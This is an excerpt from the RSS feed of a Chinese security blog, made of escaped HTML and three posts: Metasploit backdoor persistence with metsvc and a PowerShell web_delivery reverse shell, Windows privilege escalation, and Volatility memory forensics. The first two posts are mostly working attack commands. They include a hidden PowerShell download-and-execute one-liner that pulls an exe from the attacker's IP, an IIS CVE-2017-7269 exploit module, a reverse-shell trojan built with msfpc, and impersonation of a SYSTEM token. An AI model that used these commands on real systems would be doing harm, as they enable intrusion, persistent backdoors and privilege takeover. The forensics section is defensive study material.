&lt;figure class=&#34;highlight cmd&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;run metsvc -h # 查看帮助&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;run metsvc -A # 自动安装后门&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;run metsvc -r # 删除后门&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;连接后门&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;use exploit/multi/handler&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;set&lt;/span&gt; payload windows/metsvc_bind_tcp&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;set&lt;/span&gt; rhost &lt;span class=&#34;number&#34;&gt;192&lt;/span&gt;.&lt;span class=&#34;number&#34;&gt;168&lt;/span&gt;.&lt;span class=&#34;number&#34;&gt;183&lt;/span&gt;.&lt;span class=&#34;number&#34;&gt;169&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;set&lt;/span&gt; lport &lt;span class=&#34;number&#34;&gt;31337&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;run&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&#34;powershell-后门&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#powershell-后门&#34;&gt;#&lt;/a&gt; Powershell 后门&lt;/h3&gt;
&lt;figure class=&#34;highlight cmd&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;use exploit/multi/script/web_delivery&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;set&lt;/span&gt; payload windows/meterpreter/reverse_tcp&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;set&lt;/span&gt; LHOST &lt;span class=&#34;number&#34;&gt;192&lt;/span&gt;.&lt;span class=&#34;number&#34;&gt;168&lt;/span&gt;.&lt;span class=&#34;number&#34;&gt;183&lt;/span&gt;.&lt;span class=&#34;number&#34;&gt;147&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;set&lt;/span&gt; LPORT &lt;span class=&#34;number&#34;&gt;2334&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;set&lt;/span&gt; srvport &lt;span class=&#34;number&#34;&gt;2333&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;set&lt;/span&gt; uripath /&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;set&lt;/span&gt; target &lt;span class=&#34;number&#34;&gt;5&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;run&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;在目标设备 &lt;span class=&#34;built_in&#34;&gt;cmd&lt;/span&gt; 上执行以下命令即可反弹&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;powershell.exe -nop -w hidden -c $z=&amp;quot;&lt;span class=&#34;built_in&#34;&gt;echo&lt;/span&gt; ($env:temp+&amp;#x27;\eJedcsJE.exe&amp;#x27;)&amp;quot;; (new-object&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;System.&lt;span class=&#34;built_in&#34;&gt;Net&lt;/span&gt;.WebClient).DownloadFile(&amp;#x27;http://&lt;span class=&#34;number&#34;&gt;192&lt;/span&gt;.&lt;span class=&#34;number&#34;&gt;168&lt;/span&gt;.&lt;span class=&#34;number&#34;&gt;183&lt;/span&gt;.&lt;span class=&#34;number&#34;&gt;147&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;2333&lt;/span&gt;/&amp;#x27;, $z); invoke-item $z&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://chungod.github.io/2021/04/16/Windows%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83/</guid>
            <title>Windows内核提权</title>
            <link>https://chungod.github.io/2021/04/16/Windows%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83/</link>
            <category>Windows内核提权</category>
            <pubDate>Fri, 16 Apr 2021 00:00:00 +0800</pubDate>
            <description><![CDATA[ &lt;h2 id=&#34;windows内核提权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#windows内核提权&#34;&gt;#&lt;/a&gt; Windows 内核提权&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;Cve-2016-7269 低权限提权&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;第一种方法&lt;/p&gt;
&lt;p&gt;利用模块进行渗透&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;use exploit/windows/iis/cve-2017-7269&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set rhosts IP&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;exploit&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210320163403824.png&#34; alt=&#34;image-20210320163403824&#34;&gt;&lt;/p&gt;
&lt;p&gt;发现是 windows 低权限，限免进行提权&lt;/p&gt;
&lt;h3 id=&#34;生成exe上传反弹木马&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#生成exe上传反弹木马&#34;&gt;#&lt;/a&gt; 生成 exe 上传反弹木马&lt;/h3&gt;
&lt;p&gt;生成反弹木马&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;msfpc windows 本地IP 3333&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;mv windows-*.exe 1.exe&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;msfconsole -r windows-*exe.rc&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210320163757983.png&#34; alt=&#34;image-20210320172549963&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210320163555815.png&#34; alt=&#34;image-20210320163555815&#34;&gt;&lt;/p&gt;
&lt;p&gt;上传 1.exe 到 C:/1 / 下，进行反弹&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;execute -f 1.exe&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210320163856952.png&#34; alt=&#34;image-20210320163856952&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210320163912440.png&#34; alt=&#34;image-20210320163757983&#34;&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;利用run post/multi/recon/local_exploit_suggester 查看可利用模块&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210320164413649.png&#34; alt=&#34;image-20210320165533159&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210320165555084.png&#34; alt=&#34;image-20210320164413649&#34;&gt;&lt;/p&gt;
&lt;p&gt;获得 windows 高权限&lt;/p&gt;
&lt;h2 id=&#34;扩展方法&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#扩展方法&#34;&gt;#&lt;/a&gt; 扩展方法&lt;/h2&gt;
&lt;h3 id=&#34;令牌提权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#令牌提权&#34;&gt;#&lt;/a&gt; 令牌提权&lt;/h3&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210320171633846.png&#34; alt=&#34;image-20210320171633846&#34;&gt;&lt;/p&gt;
&lt;p&gt;低权限令牌提权&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;use incognito # 加载窃取令牌模块&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;list_tokens -u # 查看可用的用户令牌&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;list_tokens -g # 查看可用的用户组令牌&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;impersonate_token &amp;#x27;NT AUTHORITY\SYSTEM&amp;#x27; # 假冒 SYSTEM token&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;rev2self #返回原始 token&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210320172549963.png&#34; alt=&#34;image-20210320165555084&#34;&gt;&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://chungod.github.io/2021/04/09/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/</guid>
            <title>内存取证</title>
            <link>https://chungod.github.io/2021/04/09/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/</link>
            <category>内存取证</category>
            <pubDate>Fri, 09 Apr 2021 17:14:41 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;内存取证&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#内存取证&#34;&gt;#&lt;/a&gt; &lt;strong&gt;内存取证&lt;/strong&gt;&lt;/h1&gt;
&lt;h2 id=&#34;volatility-使用&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#volatility-使用&#34;&gt;#&lt;/a&gt; &lt;strong&gt;volatility 使用：&lt;/strong&gt;&lt;/h2&gt;
&lt;h3 id=&#34;获取内存镜像的摘要信息&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#获取内存镜像的摘要信息&#34;&gt;#&lt;/a&gt; &lt;strong&gt;获取内存镜像的摘要信息&lt;/strong&gt;&lt;/h3&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;volatility -f mem.raw imageinfo&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;strong&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20201102135222699.png&#34; alt=&#34;image-20201102135222699&#34;&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;判断系统版本应该是 Win7SP1x64&lt;/strong&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&#34;查看进程信息&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#查看进程信息&#34;&gt;#&lt;/a&gt; &lt;strong&gt;查看进程信息&lt;/strong&gt;&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;pslist 可以直接列出运行的进程，如果进程已经结束，会在 Exit 列显示日期和时间，表明进程已经结束&lt;/strong&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;volatility -f mem.raw --profile=Win7SP1x64 pslist&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;strong&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20201102141316628.png&#34; alt=&#34;image-20201102141316628&#34;&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;h3 id=&#34;查看隐藏进程&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#查看隐藏进程&#34;&gt;#&lt;/a&gt; &lt;strong&gt;查看隐藏进程&lt;/strong&gt;&lt;/h3&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;volatility -f mem.raw --profile=Win7SP1x64 pstree&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;volatility -f mem.raw --profile=Win7SP1x64 psxview&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;strong&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20201102154603111.png&#34; alt=&#34;image-20201102154603111&#34;&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;h3 id=&#34;列举缓存在内存的注册表&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#列举缓存在内存的注册表&#34;&gt;#&lt;/a&gt; &lt;strong&gt;列举缓存在内存的注册表&lt;/strong&gt;&lt;/h3&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;volatility -f mem.raw --profile=Win7SP1x64 hivelist&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;strong&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20201102150810232.png&#34; alt=&#34;image-20201102150810232&#34;&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;h3 id=&#34;提取主机名&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#提取主机名&#34;&gt;#&lt;/a&gt; &lt;strong&gt;提取主机名&lt;/strong&gt;&lt;/h3&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;volatility -f mem.raw --profile=Win7SP1x64 printkey -K &amp;quot;ControlSet001\Control\ComputerName\ComputerName&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;strong&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20201115091150119.png&#34; alt=&#34;image-20201115091150119&#34;&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;h3 id=&#34;提取自启动项&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#提取自启动项&#34;&gt;#&lt;/a&gt; &lt;strong&gt;提取自启动项&lt;/strong&gt;&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20201115091434803.png&#34; alt=&#34;image-20201115091434803&#34;&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;提取内存中保留的 cmd 命令使用情况&lt;/strong&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;volatility -f name --profile=WinXPSP2x86 cmdscan&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;strong&gt;获取到当时的网络连接情况&lt;/strong&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;volatility -f name --profile=WinXPSP2x86 netscan&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&#34;提取ip地址和主机名&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#提取ip地址和主机名&#34;&gt;#&lt;/a&gt; &lt;strong&gt;提取 ip 地址和主机名&lt;/strong&gt;&lt;/h3&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;volatility -f name --profile=WinXPSP2x86 netscan | grep ESTABLISHED&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;strong&gt;userassist 键值包含系统或桌面执行文件的信息，如名称、路径、执行次数、最后一次执行时间等&lt;/strong&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;volatility -f name --profile=WinXPSP2x86 userassist&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&#34;获取sam表中的用户&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#获取sam表中的用户&#34;&gt;#&lt;/a&gt; &lt;strong&gt;获取 SAM 表中的用户 ：&lt;/strong&gt;&lt;/h3&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;volatility -f mem.raw --profile=Win7SP1x64 printkey -K &amp;quot;SAM\Domains\Account\Users\Names&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;strong&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20201102152225937.png&#34; alt=&#34;image-20201102152225937&#34;&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;显示每个进程的加载 dll 列表&lt;/strong&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;Volatility -f name -profile = Win7SP0x86 dlllist&amp;gt; dlllist.txt&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&#34;扫描内存中的文件&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#扫描内存中的文件&#34;&gt;#&lt;/a&gt; &lt;strong&gt;扫描内存中的文件&lt;/strong&gt;&lt;/h3&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;volatility -f mem.raw --profile=Win7SP1x64 filescan&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;strong&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20201102151129039.png&#34; alt=&#34;image-20201102151129039&#34;&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;filescan 也可以结合 grep 命令来进行筛选，比如&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;volatility -f mem.raw --profile=Win7SP1x64 filescan | grep &amp;quot;doc\|docx&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;volatility -f mem.raw --profile=Win7SP1x64 filescan | grep &amp;quot;flag&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;strong&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20201102151359619.png&#34; alt=&#34;image-20201102151359619&#34;&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20201203173328344.png&#34; alt=&#34;image-20201203173328344&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;提取flag值&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#提取flag值&#34;&gt;#&lt;/a&gt; 提取 flag 值&lt;/h2&gt;
